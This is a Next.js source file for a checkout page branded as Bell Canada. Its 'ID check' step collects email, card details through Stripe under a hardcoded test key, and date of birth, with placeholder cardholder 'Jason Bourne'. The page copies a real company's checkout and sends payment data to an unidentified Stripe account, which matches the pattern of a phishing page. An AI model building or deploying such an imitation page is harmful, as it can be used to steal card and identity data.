// pages/checkout.js
import Head from 'next/head';
import Link from 'next/link';
import { useEffect, useState } from 'react';

export default function Checkout() {
  const [cardBrand, setCardBrand] = useState('');
  const [email, setEmail] = useState('');
  const [stripeInitialized, setStripeInitialized] = useState(false);
  const [paymentElementReady, setPaymentElementReady] = useState(false);
  const [errorMessages, setErrorMessages] = useState([]);
  const [isLinkEnabled, setIsLinkEnabled] = useState(false);

  // Log errors to console and state
  const logError = (message, error = null) => {
    const timestamp = new Date().toISOString();
    const errorObj = { timestamp, message, details: error ? error.toString() : null };
    
    console.error(`[${timestamp}] Checkout Error:`, message, error || '');
    setErrorMessages(prev => [...prev, errorObj]);
    
    return errorObj;
  };

  // Handle email change
  const handleEmailChange = (e) => {
    const newEmail = e.target.value;
    setEmail(newEmail);
    
    // If Stripe is initialized, update the linkAuthenticationElement
    if (stripeInitialized && window.linkAuthenticationElement) {
      try {
        window.linkAuthenticationElement.update({ defaultValues: { email: newEmail } });
        console.log('Link Authentication Element updated with email:', newEmail);
      } catch (error) {
        logError('Failed to update Link Authentication Element with email', error);
      }
    }
  };

  useEffect(() => {
    console.log('Checkout component mounted');
    let stripe, elements, paymentElement, linkAuthenticationElement;
    
    // Load Stripe.js
    const loadStripe = async () => {
      try {
        console.log('Loading Stripe.js script');
        
        // Check if Stripe is already loaded
        if (window.Stripe) {
          console.log('Stripe already loaded, initializing...');
          initializeStripe();
          return;
        }
        
        const stripeScript = document.createElement('script');
        stripeScript.src = 'https://js.stripe.com/v3/';
        stripeScript.async = true;
        
        stripeScript.onload = () => {
          console.log('Stripe.js script loaded successfully');
          initializeStripe();
        };
        
        stripeScript.onerror = (error) => {
          logError('Failed to load Stripe.js script', error);
        };
        
        document.body.appendChild(stripeScript);
      } catch (error) {
        logError('Error in loadStripe function', error);
      }
    };
    
    // Initialize Stripe with the publishable key
    const initializeStripe = () => {
      try {
        console.log('Initializing Stripe...');
        
        // Replace with your actual publishable key
        stripe = window.Stripe('pk_test_51PvkPrHIlfdz3m5tuzExO6euDe0TScV2fJY1MAPxNhTldWipi2hZgdMFD2MU24pKEkSan3xL8jwn5l4ZdXDmvC0f0083rDVDoQ');
        window.stripe = stripe; // Store for global access if needed
        
        setStripeInitialized(true);
        console.log('Stripe initialized successfully');
        
        // Now create payment intent and set up elements
        createPaymentIntent();
      } catch (error) {
        logError('Failed to initialize Stripe', error);
      }
    };
    
    // Create a payment intent and initialize Stripe Elements
    const createPaymentIntent = async () => {
      try {
        console.log('Creating payment intent...');
        
        const response = await fetch('/api/create-payment-intent', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({}),
        });
        
        if (!response.ok) {
          const errorText = await response.text();
          throw new Error(`API returned ${response.status}: ${errorText}`);
        }
        
        const { clientSecret } = await response.json();
        console.log('Payment intent created successfully');
        
        // Initialize Elements
        initializeElements(clientSecret);
      } catch (error) {
        logError('Failed to create payment intent', error);
        
        // Show error in the UI
        const messageElement = document.getElementById('payment-message');
        if (messageElement) {
          messageElement.textContent = `Failed to initialize payment: ${error.message}`;
          messageElement.style.display = 'block';
        }
      }
    };
    
    // Initialize Stripe Elements with the client secret
    const initializeElements = (clientSecret) => {
      try {
        console.log('Initializing Stripe Elements...');
        
        const appearance = {
          theme: 'stripe',
          variables: {
            colorPrimary: '#00549a',
          },
        };
        
        // Create Elements instance
        elements = stripe.elements({
          appearance,
          clientSecret,
          loader: 'auto',
        });
        
        window.elements = elements; // Store for global access if needed
        
        // Create and mount Link Authentication Element
        console.log('Creating Link Authentication Element...');
        linkAuthenticationElement = elements.create('linkAuthentication', {
          defaultValues: {
            email: email, // Use the initial email value from state
          },
        });
        
        window.linkAuthenticationElement = linkAuthenticationElement;
        
        // Mount the Link Authentication Element
        linkAuthenticationElement.mount('#link-authentication-element');
        
        // Listen for changes to detect when Link is available
        linkAuthenticationElement.on('change', (event) => {
          console.log('Link Authentication Element change:', event);
          
          // Check if Link is enabled
          if (event.value && event.value.email) {
            console.log('Email detected in Link:', event.value.email);
            setEmail(event.value.email);
          }
          
          setIsLinkEnabled(!!event.value && !!event.value.email);
        });
        
        // Create and mount Payment Element
        console.log('Creating Payment Element...');
        paymentElement = elements.create('payment', {
          fields: {
            billingDetails: {
              name: 'never',
              email: 'never', // We collect email separately
            },
          },
        });
        
        window.paymentElement = paymentElement;
        
        // Listen for changes to detect card brand
        paymentElement.on('change', (event) => {
          console.log('Payment Element change event:', event);
          
          // Set payment element ready state
          setPaymentElementReady(event.complete || false);
          
          // Check if event has complete payment details and a brand
          if (event.value && event.value.type === 'card' && event.value.card && event.value.card.brand) {
            const detectedBrand = event.value.card.brand;
            setCardBrand(detectedBrand);
            console.log('Card brand detected:', detectedBrand);
            
            // Update UI to show the detected card brand
            const cardBrandDisplay = document.getElementById('card-brand-display');
            if (cardBrandDisplay) {
              cardBrandDisplay.textContent = `${detectedBrand.toUpperCase()} card detected`;
              cardBrandDisplay.style.display = 'block';
            }
          } else if (event.empty) {
            // Clear card brand when field is emptied
            setCardBrand('');
            const cardBrandDisplay = document.getElementById('card-brand-display');
            if (cardBrandDisplay) {
              cardBrandDisplay.style.display = 'none';
            }
          }
        });
        
        // Mount payment element
        paymentElement.mount('#payment-element');
        console.log('Payment Element mounted successfully');
        
        // Set up form submission handler
        const form = document.getElementById('payment-form');
        if (form) {
          form.addEventListener('submit', handleSubmit);
          console.log('Form submission handler attached');
        } else {
          logError('Payment form not found in DOM');
        }
        
      } catch (error) {
        logError('Failed to initialize Stripe Elements', error);
        
        // Show error in the UI
        const messageElement = document.getElementById('payment-message');
        if (messageElement) {
          messageElement.textContent = `Failed to initialize payment form: ${error.message}`;
          messageElement.style.display = 'block';
        }
      }
    };
    
    // Handle form submission
    const handleSubmit = async (e) => {
      e.preventDefault();
      console.log('Form submitted');
      
      // Show processing state
      setLoading(true);
      
      // Validate email
      if (!email || !email.includes('@')) {
        showMessage('Please enter a valid email address');
        setLoading(false);
        return;
      }
      
      // Validate date of birth
      const dob = document.getElementById('dob').value;
      if (!dob) {
        showMessage('Please enter your date of birth');
        setLoading(false);
        return;
      }
      
      try {
        console.log('Confirming payment...');
        
        // Confirm the payment
        const { error } = await stripe.confirmPayment({
          elements,
          confirmParams: {
            return_url: window.location.origin + '/success',
            receipt_email: email,
            payment_method_data: {
              billing_details: {
                name: 'Jason Bourne',
                email: email,
                address: {
                  city: 'Vancouver',
                  country: 'CA',
                  line1: '220-885 Georgia St',
                  postal_code: 'V6C 3E8',
                  state: 'BC'
                }
              },
            },
          },
        });
        
        // Handle any errors
        if (error) {
          logError('Payment confirmation error', error);
          
          if (error.type === 'card_error' || error.type === 'validation_error') {
            showMessage(error.message);
          } else {
            showMessage('An unexpected error occurred during payment processing.');
          }
          
          setLoading(false);
        } else {
          // This point is typically not reached as the page will redirect on success
          console.log('Payment successful - this message will not typically be seen');
        }
      } catch (error) {
        logError('Exception during payment confirmation', error);
        showMessage('An error occurred while processing your payment.');
        setLoading(false);
      }
    };
    
    // Show message in the UI
    const showMessage = (messageText) => {
      console.log('Showing message:', messageText);
      
      const messageContainer = document.getElementById('payment-message');
      if (messageContainer) {
        messageContainer.textContent = messageText;
        messageContainer.style.display = 'block';
        
        // Hide the message after 8 seconds
        setTimeout(function () {
          messageContainer.style.display = 'none';
          messageContainer.textContent = '';
        }, 8000);
      } else {
        console.warn('Message container not found in DOM');
      }
    };
    
    // Set loading state
    const setLoading = (isLoading) => {
      const submitButton = document.getElementById('submit');
      const spinner = document.getElementById('spinner');
      const buttonText = document.getElementById('button-text');
      
      if (!submitButton || !spinner || !buttonText) {
        console.warn('Submit button elements not found in DOM');
        return;
      }
      
      if (isLoading) {
        submitButton.disabled = true;
        spinner.style.display = 'inline';
        buttonText.style.display = 'none';
      } else {
        submitButton.disabled = false;
        spinner.style.display = 'none';
        buttonText.style.display = 'inline';
      }
    };
    
    // Load Stripe
    loadStripe();
    
    // Cleanup function
    return () => {
      console.log('Cleaning up Checkout component...');
      
      // Remove event listeners to prevent memory leaks
      const form = document.getElementById('payment-form');
      if (form) {
        form.removeEventListener('submit', handleSubmit);
      }
      
      // Clean up Stripe elements if necessary
      if (paymentElement) {
        paymentElement.unmount();
        console.log('Payment Element unmounted');
      }
      
      if (linkAuthenticationElement) {
        linkAuthenticationElement.unmount();
        console.log('Link Authentication Element unmounted');
      }
    };
  }, []); // Empty dependency array means this effect runs once on mount

  // Render any errors in development mode
  const renderErrorLog = () => {
    if (process.env.NODE_ENV !== 'development' || errorMessages.length === 0) {
      return null;
    }
    
    return (
      <div style={{
        marginTop: '20px',
        padding: '15px',
        backgroundColor: '#fff0f0',
        border: '1px solid #ffcccc',
        borderRadius: '4px',
      }}>
        <h4 style={{ margin: '0 0 10px', color: '#cc0000' }}>Debug Error Log:</h4>
        <ul style={{ margin: 0, padding: '0 0 0 20px' }}>
          {errorMessages.map((err, index) => (
            <li key={index} style={{ marginBottom: '5px' }}>
              <strong>{err.timestamp}:</strong> {err.message}
              {err.details && <pre style={{ margin: '5px 0', backgroundColor: '#f9f9f9', padding: '5px', overflow: 'auto' }}>{err.details}</pre>}
            </li>
          ))}
        </ul>
      </div>
    );
  };

  return (
    <div>
      <Head>
        <title>Setup &amp; verification | Checkout | Bell Canada</title>
        <meta name="description" content="Bell Canada checkout page" />
      </Head>

      <header className="header">
        <div className="container">
          <div className="header-content">
            <Link href="/" className="logo">Bell</Link>
            <div>
              <Link href="/cart" style={{color: 'white', textDecoration: 'none'}}>
                <span style={{marginRight: '8px'}}>Back to cart</span>
              </Link>
            </div>
          </div>
        </div>
      </header>

      <div className="progress-steps">
        <div className="container">
          <div className="steps">
            <div className="step complete">
              <div className="step-number">✓</div>
              <div className="step-label">Customer information</div>
            </div>
            <div className="step complete">
              <div className="step-number">✓</div>
              <div className="step-label">Number setup</div>
            </div>
            <div className="step complete">
              <div className="step-number">✓</div>
              <div className="step-label">Shipping</div>
            </div>
            <div className="step active">
              <div className="step-number">4</div>
              <div className="step-label">ID check</div>
            </div>
            <div className="step">
              <div className="step-number">5</div>
              <div className="step-label">Review & place order</div>
            </div>
          </div>
          
          <div className="mobile-steps">
            <span>4/5 - ID check</span>
          </div>
        </div>
      </div>

      <div className="container">
        <div className="checkout-container">
          <div className="checkout-form">
            <h2>ID check</h2>
            <p>This information is required for online purchases and is used to verify and protect your identity. We keep this information safe and will not use it for any other purpose.</p>
            <p>To protect our customers, devices purchased fraudulently from Bell will be disabled.</p>
            <p>* Required fields</p>
            
            <div className="form-section">
              <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center'}}>
                <h3>Billing address</h3>
                <a href="#" style={{color: 'var(--bell-blue)', textDecoration: 'none'}}>Edit</a>
              </div>
              <p>220-885 Georgia St, <br/>Vancouver, BC, V6C 3E8</p>
            </div>
            
            <div className="form-section">
              <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center'}}>
                <h3>Cardholder name</h3>
                <a href="#" style={{color: 'var(--bell-blue)', textDecoration: 'none'}}>Edit</a>
              </div>
              <p>Jason Bourne</p>
            </div>

            <form id="payment-form">
              {/* Email input for Stripe Link */}
              <div className="form-group">
                <label htmlFor="customer-email" className="form-label">
                  <span style={{color: '#e53935'}}>*</span> Email address
                </label>
                <input 
                  id="customer-email"
                  type="email"
                  value={email}
                  onChange={handleEmailChange}
                  className="form-control"
                  placeholder="email@example.com"
                  required
                />
                <p className="small-text" style={{margin: '5px 0 0', color: '#666'}}>
                  We'll send your receipt to this email
                </p>
              </div>
              
              {/* Link Authentication Element - Will appear once email is entered */}
              <div 
                id="link-authentication-element" 
                style={{marginBottom: '20px'}}
              >
                {/* Stripe Link will mount here */}
              </div>
              
              {/* Payment details section */}
              <div className="form-section">
                <div className="form-group">
                  <label htmlFor="payment-element" className="form-label">
                    <span style={{color: '#e53935'}}>*</span> Payment information
                  </label>
                  <div id="payment-element" className="card-details">
                    {/* Stripe Payment Element will mount here */}
                  </div>
                  
                  {/* Card Brand Display Element */}
                  <div 
                    id="card-brand-display" 
                    style={{
                      display: 'none', 
                      marginTop: '10px',
                      padding: '8px 12px',
                      backgroundColor: '#f0f9ff',
                      borderRadius: '4px',
                      color: 'var(--bell-blue)',
                      fontWeight: '500'
                    }}
                  >
                    {cardBrand && `${cardBrand.toUpperCase()} card detected`}
                  </div>
                </div>

                <div className="form-group">
                  <label className="form-label" htmlFor="dob">
                    <span style={{color: '#e53935'}}>*</span> Date of Birth
                  </label>
                  <input type="text" id="dob" className="form-control" placeholder="MM/DD/YYYY" />
                </div>
              </div>
              
              {/* Payment error messages */}
              <div id="payment-message" className="error" style={{display: 'none'}}></div>
              
              {/* Submit button */}
              <button id="submit" className="btn" type="submit">
                <div className="spinner" id="spinner"></div>
                <span id="button-text">Next: Review</span>
              </button>
            </form>
            
            {/* Render debug error log in development mode */}
            {renderErrorLog()}
            
            {/* Stripe initialization status */}
            {process.env.NODE_ENV === 'development' && (
              <div style={{marginTop: '20px', fontSize: '12px', color: '#666'}}>
                <p>Stripe Status: {stripeInitialized ? '✅ Initialized' : '⏳ Loading...'}</p>
                <p>Payment Element: {paymentElementReady ? '✅ Ready' : '⏳ Loading...'}</p>
                <p>Link Status: {isLinkEnabled ? '✅ Enabled' : '⏳ Waiting for email'}</p>
              </div>
            )}
          </div>
          
          <div className="order-summary">
            <h3>Summary</h3>
            
            <div className="summary-row">
              <div className="summary-label">Due monthly</div>
              <div className="summary-price">$95.21</div>
            </div>
            
            <div style={{marginTop: '10px', color: '#666', fontSize: '14px'}}>after taxes</div>
            
            <div className="summary-row" style={{marginTop: '20px'}}>
              <div className="summary-label">Due today</div>
              <div className="summary-price">$0.00</div>
            </div>
            
            <div style={{marginTop: '10px', color: '#666', fontSize: '14px'}}>after taxes & shipping</div>
            
            <div style={{marginTop: '30px', backgroundColor: '#f4f4f4', padding: '20px', borderRadius: '8px'}}>
              <h4 style={{marginTop: '0'}}>Your purchase includes:</h4>
              
              <div style={{display: 'flex', marginBottom: '15px'}}>
                <div style={{width: '30px', color: 'var(--bell-blue)', fontSize: '24px', textAlign: 'center'}}>
                  <span>📊</span>
                </div>
                <div style={{marginLeft: '10px', flex: '1'}}>
                  <p style={{margin: '0', fontSize: '14px'}}>Exclusive online savings - Bonus savings of $70 if you place your online order today<sup>†</sup></p>
                </div>
              </div>
              
              <div style={{display: 'flex', marginBottom: '15px'}}>
                <div style={{width: '30px', color: 'var(--bell-blue)', fontSize: '24px', textAlign: 'center'}}>
                  <span>🚚</span>
                </div>
                <div style={{marginLeft: '10px', flex: '1'}}>
                  <p style={{margin: '0', fontSize: '14px'}}>Fast shipping</p>
                </div>
              </div>
              
              <div style={{display: 'flex', marginBottom: '15px'}}>
                <div style={{width: '30px', color: 'var(--bell-blue)', fontSize: '24px', textAlign: 'center'}}>
                  <span>↩️</span>
                </div>
                <div style={{marginLeft: '10px', flex: '1'}}>
                  <p style={{margin: '0', fontSize: '14px'}}>Hassle-free returns</p>
                </div>
              </div>
              
              <div style={{textAlign: 'center', marginTop: '20px'}}>
                <a href="#" style={{color: 'var(--bell-blue)', textDecoration: 'none'}}>Learn more</a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
